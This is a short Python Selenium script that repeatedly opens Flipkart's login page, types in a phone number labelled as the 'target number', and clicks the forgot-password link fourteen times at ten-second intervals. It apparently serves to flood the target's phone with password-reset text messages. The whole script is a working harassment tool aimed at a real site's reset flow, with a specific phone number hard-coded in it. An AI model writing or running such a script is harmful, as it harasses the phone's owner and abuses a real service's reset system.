from selenium import webdriver
import time
driver="D:/Selenium/env/Scripts/chromedriver.exe" #address of the chrome driver
browser=webdriver.Chrome(driver)
frequency=14
mobile_no="8193037318" #target number
for i in range(frequency):
    browser.get("https://www.flipkart.com/account/login?ret=/")
    number=browser.find_element_by_class_name("_2zrpKA")
    number.send_keys(mobile_no) #entering mobile number in the field
    forgot=browser.find_element_by_class_name("_21JmK0") 
    forgot.click() #clicking forgot link
    time.sleep(10) #time in sec to send next message
browser.quit()



